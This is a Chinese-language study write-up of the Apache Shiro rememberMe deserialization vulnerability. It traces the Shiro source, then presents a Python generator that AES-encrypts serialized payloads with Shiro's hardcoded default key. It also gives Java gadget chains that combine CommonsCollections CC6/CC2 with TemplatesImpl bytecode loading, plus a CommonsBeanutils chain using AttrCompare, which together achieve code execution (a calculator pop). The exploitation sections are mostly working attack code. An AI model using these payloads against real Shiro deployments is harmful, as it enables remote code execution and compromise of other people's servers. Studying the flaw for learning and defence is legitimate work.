shiro搭建教程可以在网上自行搜索

# 漏洞发现

进入shiro界面后，burp抓包，选择remember me并进行登录。观察burp抓到的包

登录之后服务器返回一个Cookie Remember me

![image-20240710143754561](https://s2.loli.net/2024/07/10/LgjfSrXTG6noJFP.png)

之后用户的访问都带着这个Cookie

![image-20240710143859702](https://s2.loli.net/2024/07/10/J1hjaCy7L6Ntbxg.png)

这个Cookie很长，可能会在里面存在一定的信息

# 源码审计

接下来去shiro源码中，看下Remember me Cookie的获取及使用

找到CookieRememberMeManager类，

```java
protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { //从请求中，获得cookie

    if (!WebUtils.isHttp(subjectContext)) {
        if (log.isDebugEnabled()) {
            String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                    "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                    "immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }
        return null;
    }

    WebSubjectContext wsc = (WebSubjectContext) subjectContext;
    if (isIdentityRemoved(wsc)) {
        return null;
    }

    HttpServletRequest request = WebUtils.getHttpRequest(wsc);
    HttpServletResponse response = WebUtils.getHttpResponse(wsc);

    String base64 = getCookie().readValue(request, response);
    // Browsers do not always remove cookies immediately (SHIRO-183)
    // ignore cookies that are scheduled for removal
    if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

    if (base64 != null) {
        base64 = ensurePadding(base64);
        if (log.isTraceEnabled()) {
            log.trace("Acquired Base64 encoded identity [" + base64 + "]");
        }
        byte[] decoded = Base64.decode(base64);     //将Cookie base64解码
        if (log.isTraceEnabled()) {
            log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
        }
        return decoded;   //返回解码后的值
    } else {
        //no cookie set - new site visitor?
        return null;
    }
}
```

然后看解码之后进行了什么操作，就找谁调用了getRememberedSerializedIdentity。找到getRememberedPrincipals

```java
public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
    PrincipalCollection principals = null;
    try {
        byte[] bytes = getRememberedSerializedIdentity(subjectContext);   //调用
        //SHIRO-138 - only call convertBytesToPrincipals if bytes exist:
        if (bytes != null && bytes.length > 0) {
            principals = convertBytesToPrincipals(bytes, subjectContext); //进入convertBytesToPrincipals 方法 认证
        }
    } catch (RuntimeException re) {
        principals = onRememberedPrincipalFailure(re, subjectContext);
    }

    return principals;
}
```

```java
protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
    if (getCipherService() != null) {
        bytes = decrypt(bytes);  //解密
    }
    return deserialize(bytes);   //反序列化
}
```

一次看解密和反序列化，先看解密方法

```java
protected byte[] decrypt(byte[] encrypted) {
    byte[] serialized = encrypted;
    CipherService cipherService = getCipherService();
    if (cipherService != null) {
        ByteSource byteSource = cipherService.decrypt(encrypted, getDecryptionCipherKey());   //在此处进行了解密
        serialized = byteSource.getBytes();
    }
    return serialized;
}
```

之后先看密钥key的获取getDecryptionCipherKey()，最后我们是找到了key是在CookieRememberMeManager父类AbstractRememberMeManager的构造函数处，被赋值的而且key是固定值

```java
public AbstractRememberMeManager() {
    this.serializer = new DefaultSerializer<PrincipalCollection>();
    this.cipherService = new AesCipherService();
    setCipherKey(DEFAULT_CIPHER_KEY_BYTES);
}

private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

加密解密服务用的是AES(这里贴的是加密的代码，output=iv+encrypted)  

**iv是在base64中的，解密时直接把iv取出来用，所以我们写payload时iv可以随机生成。**  

```java
public ByteSource encrypt(byte[] plaintext, byte[] key) {
    byte[] ivBytes = null;
    boolean generate = isGenerateInitializationVectors(false);
    if (generate) {
        ivBytes = generateInitializationVector(false);
        if (ivBytes == null || ivBytes.length == 0) {
            throw new IllegalStateException("Initialization vector generation is enabled - generated vector" +
                    "cannot be null or empty.");
        }
    }
    return encrypt(plaintext, key, ivBytes, generate);
}
```

```java
private ByteSource encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv) throws CryptoException {

    final int MODE = javax.crypto.Cipher.ENCRYPT_MODE;

    byte[] output;

    if (prependIv && iv != null && iv.length > 0) {

        byte[] encrypted = crypt(plaintext, key, iv, MODE);

        output = new byte[iv.length + encrypted.length];              //iv

        //now copy the iv bytes + encrypted bytes into one output array:

        // iv bytes:
        System.arraycopy(iv, 0, output, 0, iv.length);

        // + encrypted bytes:
        System.arraycopy(encrypted, 0, output, iv.length, encrypted.length);  //iv和密文会一起被传进output中
    } else {
        output = crypt(plaintext, key, iv, MODE);
    }

    if (log.isTraceEnabled()) {
        log.trace("Incoming plaintext of size " + (plaintext != null ? plaintext.length : 0) + ".  Ciphertext " +
                "byte array is size " + (output != null ? output.length : 0));
    }

    return ByteSource.Util.bytes(output);
}
```

最后是反序列化

```java
public T deserialize(byte[] serialized) throws SerializationException {
    if (serialized == null) {
        String msg = "argument cannot be null.";
        throw new IllegalArgumentException(msg);
    }
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
    BufferedInputStream bis = new BufferedInputStream(bais);
    try {
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
        @SuppressWarnings({"unchecked"})
        T deserialized = (T) ois.readObject();  //这个readObject可以利用
        ois.close();
        return deserialized;
    } catch (Exception e) {
        String msg = "Unable to deserialze argument byte array.";
        throw new SerializationException(msg, e);
    }
}
```

**现在知道服务端接受Remember me Cookie之后，先进行base64解码，之后AES解密，最后进行反序列化。**

# 漏洞利用

用python写的生成payload的代码

```python
import sys
import base64
import uuid
from random import Random
from Crypto.Cipher import AES

def get_file_data(filename):
    with open(filename,'rb') as file:
        data = file.read()
    return data
    
def aes_enc(data):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(data)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
    
if __name__ == '__main__':
    data = get_file_data("s.ser")
    print(aes_enc(data))
```



## CC3

### 报错

试着打下CC3

因为shiro的依赖中没有用到CC库，所以我们要手动添加个CC依赖

用插件Maven Helper，可以看到CC依赖是test（不会被打包）

所以要手动添加依赖cc3.2.1

下面分析为什么shiro不能加载数组类时要用到tomcat的依赖源码

```xml
<dependency>
    <groupId>org.apache.tomcat.embed</groupId>
    <artifactId>tomcat-embed-core</artifactId>
    <version>9.0.91</version>
</dependency>
```

![image-20240711144602742](https://s2.loli.net/2024/07/11/6N3UVw9cJiyHTWu.png)

添加依赖后，拿CC6打一下

会发现没法赢反应，看下输出

发现是Poc里面用到的，Transformer数组在反序列化的时候报错了。

![image-20240711155018988](https://s2.loli.net/2024/07/11/rE1vQef7yWUdKFb.png)

### 错误溯源

这里我简单记录下，大家可以去看 [Shiro反序列化漏洞（二）](https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.788&vd_source=686636e30f91f8a12e28751943870859)

[违反ClassLoader双亲委派机制三部曲第二部——Tomcat类加载机制](https://www.jianshu.com/p/a18aecaecc89)

跟进一下报错位置deserialize

可以发现shiro的readObject不是直接用的java.io.ObjectInputStream，而是用的自定义的ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);

```java
public T deserialize(byte[] serialized) throws SerializationException {
    if (serialized == null) {
        String msg = "argument cannot be null.";
        throw new IllegalArgumentException(msg);
    }
    ByteArrayInputStream bais = new ByteArrayInputStream(serialized);
    BufferedInputStream bis = new BufferedInputStream(bais);
    try {
        ObjectInputStream ois = new ClassResolvingObjectInputStream(bis);
        @SuppressWarnings({"unchecked"})
        T deserialized = (T) ois.readObject();
        ois.close();
        return deserialized;
    } catch (Exception e) {
        String msg = "Unable to deserialze argument byte array.";    //抛出异常
        throw new SerializationException(msg, e);
    }
}
```

跟进ClassResolvingObjectInputStream看下，

它继承了ObjectInputStream，并重写了resolveClass方法，错误应该就出现在这个地方。

```java
public class ClassResolvingObjectInputStream extends ObjectInputStream {

    public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }
    @Override
    protected Class<?> resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {
        try {
            return ClassUtils.forName(osc.getName());                       //区别在这forName方法用的是自定义CLassUtils类的
        } catch (UnknownClassException e) {
            throw new ClassNotFoundException("Unable to load ObjectStreamClass [" + osc + "]: ", e);
        }
    }
}

///////////////////下面是ObjectInputStream的resolveClass方法/////////////////
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String name = desc.getName();

        try {
            return Class.forName(name, false, latestUserDefinedLoader());  
        } catch (ClassNotFoundException var5) {
            Class<?> cl = (Class)primClasses.get(name);
            if (cl != null) {
                return cl;
            } else {
                throw var5;
            }
        }
    }
```

跟进ClassUtils.forName(osc.getName())，一直走到WebappClassLoaderBase中的loadClass

如果类名是Tomcat引入的，Tomcat首先用自己的findClass方法寻找要加载的类，如果找不到就走JDK默认的Class.forName。

![image-20240712103207781](https://s2.loli.net/2024/07/12/IkW1vjBDyTFtzLE.png)

debug可以看到，在Tomcat的findClass(Transformers数组)时抛出了异常

进WebappClassLoaderBase findClass看看，这个类和URLClassLoader类似

![image-20240712110006360](https://s2.loli.net/2024/07/12/6IBNE12GUQ7gMms.png)

获取路径名

![image-20240712110101346](https://s2.loli.net/2024/07/12/kx7BTsziOI3r51y.png)

![image-20240712110132966](https://s2.loli.net/2024/07/12/tln8IBzkGOs9Uac.png)

这个流程和URLClassLoader的相似

![image-20240712110305723](https://s2.loli.net/2024/07/12/YRQVKpTyvm62u3U.png)

抛出异常是因为我们传入的name（要查找的类名）是[Lorg.apache.commons.collections.Transformer;经过处理转换成查找路径是

![image-20240712110801248](https://s2.loli.net/2024/07/12/AEV6RbL4vCQTY1o.png)

这个路径肯定是找不到Transformer数组类的。

**所以Poc里面不能出现数组类**

**但是要看这个数组类是在哪引入的，如果是JDK的数组类，那么在Tomcat中会调用Class.forName。这是能加载的。**

如果不重写resolveClass，反序列化是通过Class.forName寻找类的，可以找到数组类。

### 延伸

[Class.forName vs ClassLoader.loadClass](https://www.jianshu.com/p/e1a7dc749196)

这里提到的

1）Class.forName会解析数组类型，如`[Ljava.lang.String;`
2）ClassLoader不会解析数组类型，加载时会抛出ClassNotFoundException;

是因为ClassLoader.findClass时，和上面一样拿到的路径是不正确的。

### 解决问题

在之前CC CB链的学习中，我们知道CC2可以不用Transformer数组。（因为CC2不用使用ConstantTransformer(Runtime.class)控制传值，传值可以使用PriorityQueue的add；而且只实例化一个InvokerTransformer就行）

而上面打CC3我们用CC6也是因为CC6可以控制传值不使用ConstantTransformer(Runtime.class)。[CC6利用链分析](https://blog.csdn.net/weixin_45436292/article/details/140358825?spm=1001.2014.3001.5501)

所以这里考虑CC6前半个链结合CC2的后半个链（动态加载类）

更新Poc

```java
public class CC3_shiro_exp {
    public static void main(String[] args) throws Exception {
        //CC3
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());
        
        //CC2
        InvokerTransformer invokerTransformer = new InvokerTransformer("newTransformer", null, null);

        //CC6
        Map lazyMap = LazyMap.decorate(new HashMap(), invokerTransformer);
        //断掉利用链 TiedMapEntry, LazyMap, ChainedTransformer都可以
        //举个例子修改tiedMapEntry的 key
        
        TiedMapEntry tiedMapEntry = new TiedMapEntry(new HashMap(), templates);//修改传值最后调用是invokerTransformer.transform(templates)  --> templates.newTransformer

        HashMap<Object, Object> hashMap = new HashMap<>();

        hashMap.put(tiedMapEntry, 1);

        //复原
        //因为key为private，而且也没有public方法能直接修改key
        //利用反射
        Class c = TiedMapEntry.class;
        Field key = c.getDeclaredField("map");
        key.setAccessible(true);
        key.set(tiedMapEntry, lazyMap);

        //cc1_poc.serialize(hashMap);
        cc1_poc.unserialize("s.ser");
    }
}
```

再打一次，成功弹出计算器





## CB链

CB链之前讲过

用python脚本生成下payload，发包发现命令没有执行

![image-20240711103302273](https://s2.loli.net/2024/07/11/wK8e6EI2MDoVizG.png)

debug看一下

### BeanComparator报错

![image-20240711104300801](https://s2.loli.net/2024/07/11/4nIoCUQq65amjpk.png)

发现是加载BeanComparator失败,这是因为shiro的CB依赖版本问题，我用CB链的是1.9.4，而shiro用的是1.8.3。修改一下CB链版本再试一次。

### ComparableComparator报错

```java
public BeanComparator( final String property ) {           //我们调用的是这个构造函数，可以按到构造函数中用到了CC库的ComparableComparator，所以报错了
    this( property, ComparableComparator.getInstance() );
}

public BeanComparator( final String property, final Comparator<?> comparator ) { //解决这个问题，我们就用两个参数的这个构造函数，传进去一个shiro依赖中有的Comparator就好了
    setProperty( property );
    if (comparator != null) {
        this.comparator = comparator;
    } else {
        this.comparator = ComparableComparator.getInstance();
    }
}
```

寻找的思路是，找到即实现了Comparator接口又实现了Serializable接口的类，AttrCompare类就满足这个条件

修改CB Poc

```java
//CB
BeanComparator<Object> beanComparator = new BeanComparator<>("outputProperties",new AttrCompare());
```

重新打一下

